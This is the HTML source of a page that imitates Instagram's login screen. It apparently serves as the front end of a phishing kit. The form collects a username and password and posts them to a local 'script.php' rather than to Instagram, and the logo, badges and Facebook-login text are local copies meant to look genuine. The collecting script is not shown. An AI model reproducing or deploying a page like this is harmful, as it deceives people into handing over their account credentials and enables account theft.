<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/png" href="img/favicon.png"/>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
            <div class="img-box">
                <img src="img/iam.png" alt="placeholder-phone">
            </div>
            <div class="wrap">
                <div class="form-box">
                    <div class="form-upper">
                        <img id="logo-img" src="img/logo-text.png" alt="text-logo">
                        <form action="script.php" method="POST">
                            <input type="text" placeholder="Phone number, username, or email" name="uname">
                            <br>
                            <input type="password" placeholder="Password" name="pass">
                            <br>
                            <input type="submit" value="Log In">
                        </form>
                        <br>
                        <img src="img/or.png" alt="or-division">
                        <br>
                        <br>
                        <div class="line">
                            <img src="img/fb.png" width="16px" height="16px" alt="">
                            <p id="fb-text">&nbsp;&nbsp;&nbsp;Log in with Facebook</p>
                        </div>
                        <br>
                        <p class="fpass">Forgot Password?</p>
                    </div>
                    <div class="signup line">
                        <p>Don't have an account?</p>&nbsp;&nbsp;<a href="">Sign up</a>
                    </div>
                    <br>
                    <br>
                    <center><p id="get">Get the app.</p></center>
                    <div class="store line">
                        <img src="img/appstore.png" width="136px" height="40px" alt="">
                        <img src="img/playstore.png" width="136px" height="40px" alt="">
                    </div>
            </div>
            </div>
    </div>
    <div class="misc line">
        <img src="img/misc.png" alt="miscelleaneous items">
    </div>
</body>
</html>
